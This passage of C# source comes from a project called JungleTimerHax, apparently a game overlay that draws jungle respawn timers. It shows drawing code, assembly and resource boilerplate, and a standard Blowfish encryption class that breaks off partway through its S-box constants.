                    string display = string.Format("{0}:{1:D2}", time.Minutes, time.Seconds);

                    var OutlineColor = Config.Item("OutlineColor").GetValue<Circle>();
                    var TextColor = Config.Item("TextColor").GetValue<Circle>();

                    Drawing.DrawText(pos.X + 1 - display.Length * 3, pos.Y - 4, OutlineColor.Color, display);
                    Drawing.DrawText(pos.X - 1 - display.Length * 3, pos.Y - 6, OutlineColor.Color, display);
                    Drawing.DrawText(pos.X - 1 - display.Length * 3, pos.Y - 4, OutlineColor.Color, display);
                    Drawing.DrawText(pos.X + 1 - display.Length * 3, pos.Y - 6, OutlineColor.Color, display);
                    Drawing.DrawText(pos.X - display.Length * 3, pos.Y - 5, TextColor.Color, display);
                }
            }
        }
    }
}


```

`JungleTimerHax/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTitle("JungleTimerHax")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Shalzuth")]
[assembly: AssemblyProduct("JungleTimerHax")]
[assembly: AssemblyCopyright("Copyright © 2014")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

[assembly: ComVisible(false)]

[assembly: Guid("e6cab8b6-530c-4af3-88e6-f0f6339678d7")]

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`JungleTimerHax/Properties/Resources.Designer.cs`:

```cs
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.18444
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace JungleTimerHax.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("JungleTimerHax.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
    }
}

```

`JungleTimerHax/Properties/Resources.resx`:

```resx
<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
</root>
```

`JungleTimerHax/SpectatorService/Blowfish.cs`:

```cs
//Blowfish encryption (ECB, CBC and CTR mode) as defined by Bruce Schneier here: http://www.schneier.com/paper-blowfish-fse.html
//Complies with test vectors found here: http://www.schneier.com/code/vectors.txt
//non-standard mode provided to be usable with the javascript crypto library found here: http://etherhack.co.uk/symmetric/blowfish/blowfish.html
//By Taylor Hornby, 1/7/1010, 
//Code is partly adopted from the javascript crypto library by Daniel Rench

/*USAGE:

Provide the key when creating the object. The key can be any size up to 448 bits.
The key can be given as a hex string or an array of bytes.
  BlowFish b = new BlowFish("04B915BA43FEB5B6");

The plainText can be either a string or byte array.
  string plainText = "The quick brown fox jumped over the lazy dog.";

Use the Encypt_* methods to encrypt the plaintext in the mode that you want.
To Encrypt or decrypt a byte array using CBC or CTR mode, an array of bytes, you must provide an initialization vector.
A random IV can be created by calling SetRandomIV, then accessed with the IV property as it will be required to decrypt the data.
It is safe for the IV to be known by an attacker, as long as it is NEVER reused. IVs are handled automatically when encrypting and decrypting strings.
  string cipherText = b.Encrypt_CBC(plainText);
  MessageBox.Show(cipherText);

Use the same mode of operation for decryption.
  plainText = b.Decrypt_CBC(cipherText);
  MessageBox.Show(plainText);
*/

/*Which mode should I use?
 *---ECB---
 *  ECB mode encrypts each block of data with the same key, so patterns in a large set of data will be visible. 
 *  Encrypting the same data with the same key will result in the same ciphertext. This mode should NOT be used unless neccessary.
 *  
 *---CBC---
 *  CBC mode encrypts each block of data in succession so that any changes in the data will result in a completly different ciphertext.
 *  Also, an IV is used so that encrypting the same data with the same key will result in a different ciphertext. 
 *  CBC mode is the most popular mode of operation.
 *  
 *---CTR---
 *  CTR mode uses an IV and a counter to encrypt each block individually. 
 *  Like ECB mode, with the added protection of an IV to make sure the same plaintext encrypted with the same key yeilds a different result.
 *  The counter ensures that no patterns will be visible. CTR mode is secure and can be optimized for multi-threaded applications.
 * 
 * For more information on cipher modes of operation, see http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation
 */

/*Things to remember
 * -Always use unique initialization vectors when using CBC and CTR mode. SetRandomIV will do the job for you.
 * -Blowfish is only as secure as the key you provide. When derriving a key from a password, use a secure hash function such as SHA-256 to create the key.
 * -Read "Which mode should I use?" and choose the best mode for your application
 * -Use a MAC to ensure that the ciphertext and IV have not been modified.
 * -Do not use the compatibility mode unless neccessary.
 */

using System;
using System.Text;
using System.Security.Cryptography;

namespace JungleTimerHax.SpectatorService
{
    class Blowfish
    {
        #region "Global variables and constants"

        const int ROUNDS = 16; //standard is 16, to increase the number of rounds, bf_P needs to be equal to the number of rouds. Use digits of PI.

        //Random number generator for creating IVs
        RNGCryptoServiceProvider randomSource;

        //SBLOCKS
        private uint[] bf_s0;
        private uint[] bf_s1;
        private uint[] bf_s2;
        private uint[] bf_s3;

        private uint[] bf_P;

        //KEY
        private byte[] key;

        //HALF-BLOCKS
        private uint xl_par;
        private uint xr_par;

        //Initialization Vector for CBC and CTR mode
        private byte[] InitVector;
        private bool IVSet;

        //For compatibility with the javascript crypto library:
        //  http://etherhack.co.uk/symmetric/blowfish/blowfish.html
        private bool nonStandardMethod;

        #endregion

        #region "Constructors"

        /// <summary>
        /// Constructor for hex key
        /// </summary>
        /// <param name="hexKey">Cipher key as a hex string</param>
        public Blowfish(string hexKey)
        {
            randomSource = new RNGCryptoServiceProvider();
            SetupKey(HexToByte(hexKey));
        }

        /// <summary>
        /// Constructor for byte key
        /// </summary>
        /// <param name="cipherKey">Cipher key as a byte array</param>
        public Blowfish(byte[] cipherKey)
        {
            randomSource = new RNGCryptoServiceProvider();
            SetupKey(cipherKey);
        }

        #endregion

        #region "Public methods"

        /// <summary>
        /// Encrypts a string in CBC mode
        /// </summary>
        /// <param name="pt">Plaintext data to encrypt</param>
        /// <returns>Ciphertext with IV appended to front</returns>
        public string Encrypt_CBC(string pt)
        {
            if (!IVSet)
                SetRandomIV();
            return ByteToHex(InitVector) + ByteToHex(Encrypt_CBC(Encoding.ASCII.GetBytes(pt)));
        }

        /// <summary>
        /// Decrypts a string in CBC mode
        /// </summary>
        /// <param name="ct">Ciphertext with IV appended to front</param>
        /// <returns>Plaintext</returns>
        public string Decrypt_CBC(string ct)
        {
            IV = HexToByte(ct.Substring(0, 16));
            return Encoding.ASCII.GetString(Decrypt_CBC(HexToByte(ct.Substring(16)))).Replace("\0", "");
        }

        /// <summary>
        /// Decrypts a byte array in CBC mode.
        /// IV must be created and saved manually.
        /// </summary>
        /// <param name="ct">Ciphertext data to decrypt</param>
        /// <returns>Plaintext</returns>
        public byte[] Decrypt_CBC(byte[] ct)
        {
            return Crypt_CBC(ct, true);
        }

        /// <summary>
        /// Encrypts a byte array in CBC mode.
        /// IV must be created and saved manually.
        /// </summary>
        /// <param name="pt">Plaintext data to encrypt</param>
        /// <returns>Ciphertext</returns>
        public byte[] Encrypt_CBC(byte[] pt)
        {
            return Crypt_CBC(pt, false);
        }

        /// <summary>
        /// Encrypt a string in ECB mode
        /// </summary>
        /// <param name="pt">Plaintext to encrypt as ascii string</param>
        /// <returns>hex value of encrypted data</returns>
        public string Encrypt_ECB(string pt)
        {
            return ByteToHex(Encrypt_ECB(Encoding.ASCII.GetBytes(pt)));
        }

        /// <summary>
        /// Decrypts a string (ECB)
        /// </summary>
        /// <param name="ct">hHex string of the ciphertext</param>
        /// <returns>Plaintext ascii string</returns>
        public string Decrypt_ECB(string ct)
        {
            return Encoding.ASCII.GetString(Decrypt_ECB(HexToByte(ct)));//.Replace("\0", "");
        }

        /// <summary>
        /// Encrypts a byte array in ECB mode
        /// </summary>
        /// <param name="pt">Plaintext data</param>
        /// <returns>Ciphertext bytes</returns>
        public byte[] Encrypt_ECB(byte[] pt)
        {
            return Crypt_ECB(pt, false);
        }

        /// <summary>
        /// Decrypts a byte array (ECB)
        /// </summary>
        /// <param name="ct">Ciphertext byte array</param>
        /// <returns>Plaintext</returns>
        public byte[] Decrypt_ECB(byte[] ct)
        {
            return Crypt_ECB(ct, true);
        }

        /// <summary>
        /// Encrypts a string (CTR)
        /// </summary>
        /// <param name="pt">The plaintext to encrypt</param>
        /// <returns>The ciphertext</returns>
        public string Encrypt_CTR(string pt)
        {
            if (!IVSet)
                SetRandomIV();
            return ByteToHex(InitVector) + ByteToHex(Crypt_CTR(Encoding.ASCII.GetBytes(pt), 2));
        }

        /// <summary>
        /// Decrypt a string (CTR)
        /// </summary>
        /// <param name="ct">The ciphertext to decrypt</param>
        /// <returns>The plaintext</returns>
        public string Decrypt_CTR(string ct)
        {
            IV = HexToByte(ct.Substring(0, 16));
            return Encoding.ASCII.GetString(Crypt_CTR(HexToByte(ct.Substring(16)), 2)).Replace("\0", "");
        }

        /// <summary>
        /// Initialization vector for CBC mode.
        /// </summary>
        public byte[] IV
        {
            get { return InitVector; }
            set
            {
                if (value.Length == 8)
                {
                    InitVector = value;
                    IVSet = true;
                }
                else
                {
                    throw new Exception("Invalid IV size.");
                }
            }
        }

        public bool NonStandard
        {
            get { return nonStandardMethod; }
            set { nonStandardMethod = value; }
        }

        /// <summary>
        /// Creates and sets a random initialization vector.
        /// </summary>
        /// <returns>The random IV</returns>
        public byte[] SetRandomIV()
        {
            InitVector = new byte[8];
            randomSource.GetBytes(InitVector);
            IVSet = true;
            return InitVector;
        }

        #endregion

        #region Cryptography

        /// <summary>
        /// Sets up the S-blocks and the key
        /// </summary>
        /// <param name="cipherKey">Block cipher key (1-448 bits)</param>
        private void SetupKey(byte[] cipherKey)
        {
            bf_P = SetupP();
            //set up the S blocks
            bf_s0 = SetupS0();
            bf_s1 = SetupS1();
            bf_s2 = SetupS2();
            bf_s3 = SetupS3();

            key = new byte[cipherKey.Length]; // 448 bits
            if (cipherKey.Length > 56)
            {
                throw new Exception("Key too long. 56 bytes required.");
            }

            Buffer.BlockCopy(cipherKey, 0, key, 0, cipherKey.Length);
            int j = 0;
            for (int i = 0; i < 18; i++)
            {
                uint d = (uint)(((key[j % cipherKey.Length] * 256 + key[(j + 1) % cipherKey.Length]) * 256 + key[(j + 2) % cipherKey.Length]) * 256 + key[(j + 3) % cipherKey.Length]);
                bf_P[i] ^= d;
                j = (j + 4) % cipherKey.Length;
            }

            xl_par = 0;
            xr_par = 0;
            for (int i = 0; i < 18; i += 2)
            {
                encipher();
                bf_P[i] = xl_par;
                bf_P[i + 1] = xr_par;
            }

            for (int i = 0; i < 256; i += 2)
            {
                encipher();
                bf_s0[i] = xl_par;
                bf_s0[i + 1] = xr_par;
            }
            for (int i = 0; i < 256; i += 2)
            {
                encipher();
                bf_s1[i] = xl_par;
                bf_s1[i + 1] = xr_par;
            }
            for (int i = 0; i < 256; i += 2)
            {
                encipher();
                bf_s2[i] = xl_par;
                bf_s2[i + 1] = xr_par;
            }
            for (int i = 0; i < 256; i += 2)
            {
                encipher();
                bf_s3[i] = xl_par;
                bf_s3[i + 1] = xr_par;
            }
        }

        /// <summary>
        /// Encrypts or decrypts data in ECB mode
        /// </summary>
        /// <param name="text">plain/ciphertext</param>
        /// <param name="decrypt">true to decrypt, false to encrypt</param>
        /// <returns>(En/De)crypted data</returns>
        private byte[] Crypt_ECB(byte[] text, bool decrypt)
        {
            int paddedLen = (text.Length % 8 == 0 ? text.Length : text.Length + 8 - (text.Length % 8));
            byte[] plainText = new byte[paddedLen];
            Buffer.BlockCopy(text, 0, plainText, 0, text.Length);
            byte[] block = new byte[8];
            for (int i = 0; i < plainText.Length; i += 8)
            {
                Buffer.BlockCopy(plainText, i, block, 0, 8);
                if (decrypt)
                {
                    BlockDecrypt(ref block);
                }
                else
                {
                    BlockEncrypt(ref block);
                }
                Buffer.BlockCopy(block, 0, plainText, i, 8);
            }
            return plainText;
        }

        public byte[] Crypt_CTR(byte[] text, int numThreads)
        {
            if (!IVSet)
            {
                throw new Exception("IV not set.");
            }
            byte[] input = new byte[8];
            byte[] counter = new byte[8];
            int paddedLen = (text.Length % 8 == 0 ? text.Length : text.Length + 8 - (text.Length % 8));
            byte[] plainText = new byte[paddedLen];
            Buffer.BlockCopy(text, 0, plainText, 0, text.Length);
            byte[] block = new byte[8];
            for (int i = 0; i < plainText.Length; i += 8)
            {
                for (int x = 0; x < 8; x++)
                {
                    input[x] = (byte)(counter[x] ^ InitVector[x]);
                }
                Buffer.BlockCopy(plainText, i, block, 0, 8);
                BlockEncrypt(ref input);
                XorBlock(ref block, input);
                Buffer.BlockCopy(block, 0, plainText, i, 8);
            }
            return plainText;
        }

        /// <summary>
        /// Encrypts or decrypts data in CBC mode
        /// </summary>
        /// <param name="text">plain/ciphertext</param>
        /// <param name="decrypt">true to decrypt, false to encrypt</param>
        /// <returns>(En/De)crypted data</returns>
        private byte[] Crypt_CBC(byte[] text, bool decrypt)
        {
            if (!IVSet)
            {
                throw new Exception("IV not set.");
            }
            int paddedLen = (text.Length % 8 == 0 ? text.Length : text.Length + 8 - (text.Length % 8));
            byte[] plainText = new byte[paddedLen];
            Buffer.BlockCopy(text, 0, plainText, 0, text.Length);
            byte[] block = new byte[8];
            byte[] preblock = new byte[8];
            byte[] iv = new byte[8];
            Buffer.BlockCopy(InitVector, 0, iv, 0, 8);
            if (!decrypt)
            {
                for (int i = 0; i < plainText.Length; i += 8)
                {
                    Buffer.BlockCopy(plainText, i, block, 0, 8);
                    XorBlock(ref block, iv);
                    BlockEncrypt(ref block);
                    Buffer.BlockCopy(block, 0, iv, 0, 8);
                    Buffer.BlockCopy(block, 0, plainText, i, 8);
                }
            }
            else
            {
                for (int i = 0; i < plainText.Length; i += 8)
                {
                    Buffer.BlockCopy(plainText, i, block, 0, 8);

                    Buffer.BlockCopy(block, 0, preblock, 0, 8);
                    BlockDecrypt(ref block);
                    XorBlock(ref block, iv);
                    Buffer.BlockCopy(preblock, 0, iv, 0, 8);

                    Buffer.BlockCopy(block, 0, plainText, i, 8);
                }
            }
            return plainText;
        }

        /// <summary>
        /// XoR encrypts two 8 bit blocks
        /// </summary>
        /// <param name="block">8 bit block 1</param>
        /// <param name="iv">8 bit block 2</param>
        private void XorBlock(ref byte[] block, byte[] iv)
        {
            for (int i = 0; i < block.Length; i++)
            {
                block[i] ^= iv[i];
            }
        }

        /// <summary>
        /// Encrypts a 64 bit block
        /// </summary>
        /// <param name="block">The 64 bit block to encrypt</param>
        private void BlockEncrypt(ref byte[] block)
        {
            SetBlock(block);
            encipher();
            GetBlock(ref block);
        }

        /// <summary>
        /// Decrypts a 64 bit block
        /// </summary>
        /// <param name="block">The 64 bit block to decrypt</param>
        private void BlockDecrypt(ref byte[] block)
        {
            SetBlock(block);
            decipher();
            GetBlock(ref block);
        }

        /// <summary>
        /// Splits the block into the two uint values
        /// </summary>
        /// <param name="block">the 64 bit block to setup</param>
        private void SetBlock(byte[] block)
        {
            byte[] block1 = new byte[4];
            byte[] block2 = new byte[4];
            Buffer.BlockCopy(block, 0, block1, 0, 4);
            Buffer.BlockCopy(block, 4, block2, 0, 4);
            //split the block
            if (nonStandardMethod)
            {
                xr_par = BitConverter.ToUInt32(block1, 0);
                xl_par = BitConverter.ToUInt32(block2, 0);
            }
            else
            {
                //ToUInt32 requires the bytes in reverse order
                Array.Reverse(block1);
                Array.Reverse(block2);
                xl_par = BitConverter.ToUInt32(block1, 0);
                xr_par = BitConverter.ToUInt32(block2, 0);
            }
        }

        /// <summary>
        /// Converts the two uint values into a 64 bit block
        /// </summary>
        /// <param name="block">64 bit buffer to receive the block</param>
        private void GetBlock(ref byte[] block)
        {
            byte[] block1 = new byte[4];
            byte[] block2 = new byte[4];
            if (nonStandardMethod)
            {
                block1 = BitConverter.GetBytes(xr_par);
                block2 = BitConverter.GetBytes(xl_par);
            }
            else
            {
                block1 = BitConverter.GetBytes(xl_par);
                block2 = BitConverter.GetBytes(xr_par);

                //GetBytes returns the bytes in reverse order
                Array.Reverse(block1);
                Array.Reverse(block2);
            }
            //join the block
            Buffer.BlockCopy(block1, 0, block, 0, 4);
            Buffer.BlockCopy(block2, 0, block, 4, 4);
        }

        /// <summary>
        /// Runs the blowfish algorithm (standard 16 rounds)
        /// </summary>
        private void encipher()
        {
            xl_par ^= bf_P[0];
            for (uint i = 0; i < ROUNDS; i += 2)
            {
                xr_par = round(xr_par, xl_par, i + 1);
                xl_par = round(xl_par, xr_par, i + 2);
            }
            xr_par = xr_par ^ bf_P[17];

            //swap the blocks
            uint swap = xl_par;
            xl_par = xr_par;
            xr_par = swap;
        }

        /// <summary>
        /// Runs the blowfish algorithm in reverse (standard 16 rounds)
        /// </summary>
        private void decipher()
        {
            xl_par ^= bf_P[17];
            for (uint i = 16; i > 0; i -= 2)
            {
                xr_par = round(xr_par, xl_par, i);
                xl_par = round(xl_par, xr_par, i - 1);
            }
            xr_par = xr_par ^ bf_P[0];

            //swap the blocks
            uint swap = xl_par;
            xl_par = xr_par;
            xr_par = swap;
        }

        /// <summary>
        /// one round of the blowfish algorithm
        /// </summary>
        /// <param name="a">See spec</param>
        /// <param name="b">See spec</param>
        /// <param name="n">See spec</param>
        /// <returns></returns>
        private uint round(uint a, uint b, uint n)
        {
            uint x1 = (bf_s0[wordByte0(b)] + bf_s1[wordByte1(b)]) ^ bf_s2[wordByte2(b)];
            uint x2 = x1 + bf_s3[this.wordByte3(b)];
            uint x3 = x2 ^ bf_P[n];
            return x3 ^ a;
        }

        #endregion

        #region SBLOCKS
        //SBLOCKS ARE THE HEX DIGITS OF PI. 
        //The amount of hex digits can be increased if you want to experiment with more rounds and longer key lengths

        //Increase the size of this array when increasing the number of rounds
        private uint[] SetupP()
        {
            return new uint[] {
                0x243f6a88,0x85a308d3,0x13198a2e,0x03707344,0xa4093822,0x299f31d0,
                    0x082efa98,0xec4e6c89,0x452821e6,0x38d01377,0xbe5466cf,0x34e90c6c,
                    0xc0ac29b7,0xc97c50dd,0x3f84d5b5,0xb5470917,0x9216d5d9,0x8979fb1b
            };
        }

        private uint[] SetupS0()
        {
            return new uint[] {
                    0xd1310ba6,0x98dfb5ac,0x2ffd72db,0xd01adfb7,0xb8e1afed,0x6a267e96,
                    0xba7c9045,0xf12c7f99,0x24a19947,0xb3916cf7,0x0801f2e2,0x858efc16,
                    0x636920d8,0x71574e69,0xa458fea3,0xf4933d7e,0x0d95748f,0x728eb658,
                    0x718bcd58,0x82154aee,0x7b54a41d,0xc25a59b5,0x9c30d539,0x2af26013,
                    0xc5d1b023,0x286085f0,0xca417918,0xb8db38ef,0x8e79dcb0,0x603a180e,
                    0x6c9e0e8b,0xb01e8a3e,0xd71577c1,0xbd314b27,0x78af2fda,0x55605c60,
                    0xe65525f3,0xaa55ab94,0x57489862,0x63e81440,0x55ca396a,0x2aab10b6,
                    0xb4cc5c34,0x1141e8ce,0xa15486af,0x7c72e993,0xb3ee1411,0x636fbc2a,
                    0x2ba9c55d,0x741831f6,0xce5c3e16,0x9b87931e,0xafd6ba33,0x6c24cf5c,
                    0x7a325381,0x28958677,0x3b8f4898,0x6b4bb9af,0xc4bfe81b,0x66282193,
                    0x61d809cc,0xfb21a991,0x487cac60,0x5dec8032,0xef845d5d,0xe98575b1,
                    0xdc262302,0xeb651b88,0x23893e81,0xd396acc5,0x0f6d6ff3,0x83f44239,
                    0x2e0b4482,0xa4842004,0x69c8f04a,0x9e1f9b5e,0x21c66842,0xf6e96c9a,
                    0x670c9c61,0xabd388f0,0x6a51a0d2,0xd8542f68,0x960fa728,0xab5133a3,
                    0x6eef0b6c,0x137a3be4,0xba3bf050,0x7efb2a98,0xa1f1651d,0x39af0176,
                    0x66ca593e,0x82430e88,0x8cee8619,0x456f9fb4,0x7d84a5c3,0x3b8b5ebe,
                    0xe06f75d8,0x85c12073,0x401a449f,0x56c16aa6,0x4ed3aa62,0x363f7706,
                    0x1bfedf72,0x429b023d,0x37d0d724,0xd00a1248,0xdb0fead3,0x49f1c09b,
                    0x075372c9,0x80991b7b,0x25d479d8,0xf6e8def7,0xe3fe501a,0xb6794c3b,
                    0x976ce0bd,0x04c006ba,0xc1a94fb6,0x409f60c4,0x5e5c9ec2,0x196a2463,
                    0x68fb6faf,0x3e6c53b5,0x1339b2eb,0x3b52ec6f,0x6dfc511f,0x9b30952c,
                    0xcc814544,0xaf5ebd09,0xbee3d004,0xde334afd,0x660f2807,0x192e4bb3,
                    0xc0cba857,0x45c8740f,0xd20b5f39,0xb9d3fbdb,0x5579c0bd,0x1a60320a,
                    0xd6a100c6,0x402c7279,0x679f25fe,0xfb1fa3cc,0x8ea5e9f8,0xdb3222f8,
                    0x3c7516df,0xfd616b15,0x2f501ec8,0xad0552ab,0x323db5fa,0xfd238760,
                    0x53317b48,0x3e00df82,0x9e5c57bb,0xca6f8ca0,0x1a87562e,0xdf1769db,
                    0xd542a8f6,0x287effc3,0xac6732c6,0x8c4f5573,0x695b27b0,0xbbca58c8,
                    0xe1ffa35d,0xb8f011a0,0x10fa3d98,0xfd2183b8,0x4afcb56c,0x2dd1d35b,
                    0x9a53e479,0xb6f84565,0xd28e49bc,0x4bfb9790,0xe1ddf2da,0xa4cb7e33,
                    0x62fb1341,0xcee4c6e8,0xef20cada,0x36774c01,0xd07e9efe,0x2bf11fb4,
                    0x95dbda4d,0xae909198,0xeaad8e71,0x6b93d5a0,0xd08ed1d0,0xafc725e0,
                    0x8e3c5b2f,0x8e7594b7,0x8ff6e2fb,0xf2122b64,0x8888b812,0x900df01c,
                    0x4fad5ea0,0x688fc31c,0xd1cff191,0xb3a8c1ad,0x2f2f2218,0xbe0e1777,
                    0xea752dfe,0x8b021fa1,0xe5a0cc0f,0xb56f74e8,0x18acf3d6,0xce89e299,
                    0xb4a84fe0,0xfd13e0b7,0x7cc43b81,0xd2ada8d9,0x165fa266,0x80957705,
                    0x93cc7314,0x211a1477,0xe6ad2065,0x77b5fa86,0xc75442f5,0xfb9d35cf,
                    0xebcdaf0c,0x7b3e89a0,0xd6411bd3,0xae1e7e49,0x00250e2d,0x2071b35e,
                    0x226800bb,0x57b8e0af,0x2464369b,0xf009b91e,0x5563911d,0x59dfa6aa,
                    0x78c14389,0xd95a537f,0x207d5ba2,0x02e5b9c5,0x83260376,0x6295cfa9,
                    0x11c81968,0x4e734a41,0xb3472dca,0x7b14a94a,0x1b510052,0x9a532915,
                    0xd60f573f,0xbc9bc6e4,0x2b60a476,0x81e67400,0x08ba6fb5,0x571be91f,
                    0xf296ec6b,0x2a0dd915,0xb6636521,0xe7b9f9b6,0xff34052e,0xc5855664,
                    0x53b02d5d,0xa99f8fa1,0x08ba4799,0x6e85076a
            };
        }

        private uint[] SetupS1()
        {
            return new uint[] {
                0x4b7a70e9,0xb5b32944,0xdb75092e,0xc4192623,0xad6ea6b0,0x49a7df7d,
                    0x9cee60b8,0x8fedb266,0xecaa8c71,0x699a17ff,0x5664526c,0xc2b19ee1,
                    0x193602a5,0x75094c29,0xa0591340,0xe4183a3e,0x3f54989a,0x5b429d65,
                    0x6b8fe4d6,0x99f73fd6,0xa1d29c07,0xefe830f5,0x4d2d38e6,0xf0255dc1,
                    0x4cdd2086,0x8470eb26,0x6382e9c6,0x021ecc5e,0x09686b3f,0x3ebaefc9,
                    0x3c971814,0x6b6a70a1,0x687f3584,0x52a0e286,0xb79c5305,0xaa500737,
                    0x3e07841c,0x7fdeae5c,0x8e7d44ec,0x5716f2b8,0xb03ada37,0xf0500c0d,
                    0xf01c1f04,0x0200b3ff,0xae0cf51a,0x3cb574b2,0x25837a58,0xdc0921bd,
                    0xd19113f9,0x7ca92ff6,0x94324773,0x22f54701,0x3ae5e581,0x37c2dadc,
                    0xc8b57634,0x9af3dda7,0xa9446146,0x0fd0030e,0xecc8c73e,0xa4751e41,
                    0xe238cd99,0x3bea0e2f,0x3280bba1,0x183eb331,0x4e548b38,0x4f6db908,
